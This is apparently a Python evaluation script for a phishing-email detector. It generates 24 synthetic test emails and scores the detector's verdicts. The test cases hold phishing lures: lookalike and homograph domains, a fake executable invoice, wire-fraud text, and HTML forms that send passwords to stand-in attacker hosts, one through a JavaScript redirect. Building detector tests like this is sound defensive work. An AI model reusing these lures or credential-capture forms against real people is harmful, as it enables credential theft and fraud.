#!/usr/bin/env python3
"""Generate and run the documented phishing evaluation scenarios."""

import argparse
import csv
import email
import json
import mimetypes
import sys
import time
from email.message import EmailMessage
from pathlib import Path

import requests


ROOT = Path(__file__).resolve().parent
CASES_DIR = ROOT / "cases"
RESULTS_DIR = ROOT / "results"
DATE_HEADER = "Mon, 8 Sep 2026 10:00:00 +0000"


def case(case_id, category, name, label, sender, subject, body, html="", headers="", reply_to="", attachments=None, note=""):
    return {
        "id": case_id,
        "category": category,
        "name": name,
        "expected": label,
        "sender": sender,
        "reply_to": reply_to,
        "subject": subject,
        "body": body,
        "html": html,
        "headers": headers,
        "attachments": attachments or [],
        "note": note,
    }


def build_cases():
    return [
        case("1.1", "baseline", "Misspelled PayPal domain", "PHISHING", "no-reply@paypa1.com", "URGENT: Verify Your PayPal Account", "Your account has been limited. Click here to verify: http://paypa1.com/verify-account", '<a href="http://paypa1.com/verify-account">Click here to verify</a>'),
        case("1.2", "baseline", "Fake bank password reset", "PHISHING", "alerts@fake-bank.com", "Password Reset Confirmation", "Click to reset your password: http://fake-bank-secure.com/reset?token=abc123", '<a href="http://fake-bank-secure.com/reset?token=abc123">Click here to reset</a>'),
        case("1.3", "baseline", "Inheritance scam", "PHISHING", "rich_prince@gmail.com", "Claim Your Inheritance!!!", "I have $5,000,000 waiting for you. Send $500 to claim it. Bank details: send your information immediately."),
        case("1.4", "baseline", "Executable invoice attachment", "PHISHING", "invoice@fake-company.com", "Invoice #2026-001", "Please see attached invoice.", attachments=[{"filename": "invoice.exe", "content": b"MZ synthetic test attachment\n", "content_type": "application/octet-stream"}]),
        case("1.5", "baseline", "Legitimate bank password reset", "SAFE", "noreply@mybank.com", "Password Reset Request", "We received a password reset request. If this was you, click the link below. If not, ignore this email. https://mybank.com/reset?token=secure_token_here&expires=3600", '<a href="https://mybank.com/reset?token=secure_token_here&amp;expires=3600">Reset password</a>', "Authentication-Results: example; spf=pass; dkim=pass; dmarc=pass"),
        case("2.1", "url_evasion", "Long redirect URL", "PHISHING", "support@fake-paypal.com", "Account Verification", "Verify: http://paypal-verify.com/confirm?redirect=http%3A%2F%2Fverify-account.fake-bank.com%2Flogin&session=abc123&timestamp=2026-09-08T10:00:00Z&tracking=xyz789"),
        case("2.2", "url_evasion", "URL shortener", "PHISHING", "sales@company.com", "Check out this article!", "Great article: http://bit.ly/abc123", note="The documented destination is not fetched; this is a static shortener test."),
        case("2.3", "url_evasion", "Cyrillic homograph", "PHISHING", "support@раypal.com", "Account Security", "Verify account: https://раypal.com/verify"),
        case("2.4", "url_evasion", "Misleading subdomain", "PHISHING", "no-reply@bank-login.attacker.com", "Verify your account", "Click: https://bank-login.attacker.com/verify"),
        case("2.5", "url_evasion", "Recently registered domain", "PHISHING", "noreply@paypal-secure.com", "Account Verification", "Verify: https://paypal-secure.com/verify-now", note="The claimed registration date is narrative test metadata; no live WHOIS date is forced."),
        case("2.6", "url_evasion", "HTTPS phishing domain", "PHISHING", "support@phishing-bank.ru", "Update Your Payment Method", "Update: https://phishing-bank.ru/payment"),
        case("3.1", "html_evasion", "Embedded credential form", "PHISHING", "security@bank.com", "Security Check Required", "Please complete the security check.", '<form method="POST" action="http://phishing-site.ru/capture"><input name="username"><input name="password" type="password"><button>Verify Account</button></form>'),
        case("3.2", "html_evasion", "JavaScript form redirect", "PHISHING", "security@bank.com", "Security Check Required", "Please complete the security check.", '<form method="POST" action="https://bank.com/verify" onsubmit="this.action=\'http://phishing.ru/steal\'"><input name="password" type="password"></form><script>this.action=\'http://phishing.ru/steal\'</script>'),
        case("3.3", "html_evasion", "Phishing iframe", "PHISHING", "security@bank.com", "Security Check Required", "Your browser needs verification.", '<iframe src="http://phishing-login.ru/"></iframe>'),
        case("3.4", "html_evasion", "Hidden credential form", "PHISHING", "security@bank.com", "Security Check Required", "Your account needs verification.", '<form style="display:none" action="http://phishing.ru/capture"><input name="password" type="password"></form>'),
        case("4.1", "header_evasion", "Failed SPF wire transfer", "PHISHING", "cfo@company.com", "Urgent Wire Transfer Needed", "Please wire $50,000 to the account below. This is urgent and confidential.", headers="Authentication-Results: example; spf=fail; dkim=none; dmarc=none"),
        case("4.2", "header_evasion", "Display name spoofing", "PHISHING", '"PayPal Support" <attacker@phishing.com>', "Account Verification", "Verify your account immediately at http://phishing.com/login"),
        case("4.3", "header_evasion", "Reply-To mismatch", "PHISHING", "noreply@legitimate-bank.com", "Account Verification", "Reply to confirm your account.", reply_to="support@phishing-bank.ru", headers="Authentication-Results: example; spf=pass; dkim=pass; dmarc=pass"),
        case("4.4", "header_evasion", "Legitimate international domain", "SAFE", "support@banco.es", "Account Verification", "Click https://banco.es/verify to review your account.", '<a href="https://banco.es/verify">Review account</a>', "Authentication-Results: example; spf=pass; dkim=pass; dmarc=pass"),
        case("5.1", "false_positive", "Real Chase password reset", "SAFE", "noreply@chase.com", "Chase: Password Reset Confirmation", "We received your password reset request. Click the link below to set a new password. https://secure.chase.com/reset?token=abc&expires=3600 This link expires in 1 hour. If you did not request this, please ignore this email.", '<a href="https://secure.chase.com/reset?token=abc&amp;expires=3600">Reset password</a>', "Authentication-Results: example; spf=pass; dkim=pass; dmarc=pass"),
        case("5.2", "false_positive", "Legitimate GitHub notification", "SAFE", "noreply@github.com", "You have a new notification", "You were mentioned in an issue: https://github.com/org/repo/issues/123. View on GitHub.", '<a href="https://github.com/org/repo/issues/123">View on GitHub</a>', "Authentication-Results: example; spf=pass; dkim=pass"),
        case("5.3", "false_positive", "Internal maintenance alert", "SAFE", "it-team@company.com", "URGENT: System Maintenance Required", "All staff, critical security updates are scheduled tonight. Please do not use the VPN between 10 PM and 2 AM. Contact IT: https://company.internal/it-support", '<a href="https://company.internal/it-support">Contact IT</a>', "Authentication-Results: example; spf=pass; dkim=pass"),
        case("5.4", "false_positive", "Legitimate eBay marketplace email", "SAFE", "seller-alerts@ebay.com", "Your item sold for $250!", "Congratulations! Your item sold. The buyer has 3 days to pay. https://ebay.com/my/sales", '<a href="https://ebay.com/my/sales">Check your earnings</a>', "Authentication-Results: example; spf=pass; dkim=pass"),
        case("5.5", "false_positive", "Legitimate TechCrunch newsletter", "SAFE", "newsletter@techcrunch.com", "This week in tech", "Article 1: https://techcrunch.com/article1\nArticle 2: https://techcrunch.com/article2\nArticle 3: https://techcrunch.com/article3", '<a href="https://techcrunch.com/article1">Article 1</a><a href="https://techcrunch.com/article2">Article 2</a><a href="https://techcrunch.com/article3">Article 3</a>', "Authentication-Results: example; spf=pass"),
    ]


def create_eml(test_case):
    message = EmailMessage()
    message["From"] = test_case["sender"]
    message["To"] = "test-user@example.com"
    message["Subject"] = test_case["subject"]
    message["Date"] = DATE_HEADER
    if test_case["reply_to"]:
        message["Reply-To"] = test_case["reply_to"]
    for header_line in test_case["headers"].splitlines():
        if ":" in header_line:
            header_name, header_value = header_line.split(":", 1)
            message[header_name.strip()] = header_value.strip()
    message.set_content(test_case["body"])
    if test_case["html"]:
        message.add_alternative(test_case["html"], subtype="html")
    for attachment in test_case["attachments"]:
        message.add_attachment(attachment["content"], maintype="application", subtype="octet-stream", filename=attachment["filename"])
    return message.as_bytes()


def generate_cases(cases):
    CASES_DIR.mkdir(parents=True, exist_ok=True)
    for test_case in cases:
        (CASES_DIR / f"test_{test_case['id'].replace('.', '_')}.eml").write_bytes(create_eml(test_case))
    (CASES_DIR / "manifest.json").write_text(json.dumps(cases, indent=2, ensure_ascii=False, default=lambda value: value.decode("latin1") if isinstance(value, bytes) else value), encoding="utf-8")


def extract_result(payload):
    decision = payload.get("decision") or payload.get("netra_result") or payload
    risk = str(decision.get("risk", "UNKNOWN")).upper()
    try:
        score = float(decision.get("score", 0))
    except (TypeError, ValueError):
        score = 0.0
    return risk, score, decision.get("confidence", ""), decision.get("action", ""), payload.get("case_id", "")


def expected_prediction(risk):
    return "PHISHING" if risk in {"PHISHING", "SUSPICIOUS", "MEDIUM", "HIGH", "CRITICAL", "MALICIOUS"} else "SAFE"


def run_api(cases, api_url, timeout):
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    rows = []
    for index, test_case in enumerate(cases, start=1):
        path = CASES_DIR / f"test_{test_case['id'].replace('.', '_')}.eml"
        started = time.perf_counter()
        row = {"id": test_case["id"], "category": test_case["category"], "name": test_case["name"], "expected": test_case["expected"], "note": test_case["note"]}
        try:
            with path.open("rb") as eml_file:
                response = requests.post(f"{api_url.rstrip('/')}/api/v1/analyze/eml", files={"file": (path.name, eml_file, "message/rfc822")}, timeout=timeout)
            row["latency_seconds"] = round(time.perf_counter() - started, 4)
            row["http_status"] = response.status_code
            if response.ok:
                risk, score, confidence, action, case_id = extract_result(response.json())
                row.update({"predicted": expected_prediction(risk), "risk": risk, "score": score, "confidence": confidence, "action": action, "case_id": case_id, "passed": expected_prediction(risk) == test_case["expected"]})
            else:
                row.update({"predicted": "ERROR", "passed": False, "error": response.text[:500]})
        except Exception as exc:
            row.update({"latency_seconds": round(time.perf_counter() - started, 4), "predicted": "ERROR", "passed": False, "error": f"{type(exc).__name__}: {exc}"})
        rows.append(row)
        print(f"[{index:02d}/{len(cases)}] {test_case['id']:>4} {test_case['name']:<34} {'PASS' if row['passed'] else 'FAIL'}")
    return rows


def write_results(rows):
    (RESULTS_DIR / "results.json").write_text(json.dumps(rows, indent=2), encoding="utf-8")
    fields = []
    for row in rows:
        for key in row:
            if key not in fields:
                fields.append(key)
    with (RESULTS_DIR / "results.csv").open("w", newline="", encoding="utf-8-sig") as output_file:
        writer = csv.DictWriter(output_file, fieldnames=fields)
        writer.writeheader()
        writer.writerows(rows)
    passed = sum(bool(row.get("passed")) for row in rows)
    total = len(rows)
    category_lines = []
    for category in sorted({row["category"] for row in rows}):
        category_rows = [row for row in rows if row["category"] == category]
        category_lines.append(f"| {category} | {sum(bool(row.get('passed')) for row in category_rows)}/{len(category_rows)} | {sum(bool(row.get('passed')) for row in category_rows) / len(category_rows):.1%} |")
    report = ["# Automated Phishing Scenario Results", "", f"Passed: **{passed}/{total} ({passed / total:.1%})**", "", "| Category | Passed | Rate |", "|---|---:|---:|", *category_lines, "", "Results are scenario checks, not a statistically valid production accuracy estimate."]
    (RESULTS_DIR / "report.md").write_text("\n".join(report) + "\n", encoding="utf-8")
    print(f"\nSummary: {passed}/{total} passed ({passed / total:.1%})")


def main():
    parser = argparse.ArgumentParser(description="Generate and run the 24 supplied phishing test scenarios.")
    parser.add_argument("--api-url", default="http://localhost:8000", help="Running NETRA-Mail API base URL")
    parser.add_argument("--timeout", type=int, default=60, help="Per-case HTTP timeout in seconds")
    parser.add_argument("--generate-only", action="store_true", help="Only generate EML files and the manifest")
    args = parser.parse_args()
    cases = build_cases()
    generate_cases(cases)
    print(f"Generated {len(cases)} EML files in {CASES_DIR}")
    if args.generate_only:
        return 0
    try:
        response = requests.get(f"{args.api_url.rstrip('/')}/health", timeout=10)
        response.raise_for_status()
    except Exception as exc:
        print(f"Cannot reach the backend at {args.api_url}: {exc}", file=sys.stderr)
        print("Start it with: python -m uvicorn backend.main:app --reload --port 8000", file=sys.stderr)
        return 2
    write_results(run_api(cases, args.api_url, args.timeout))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())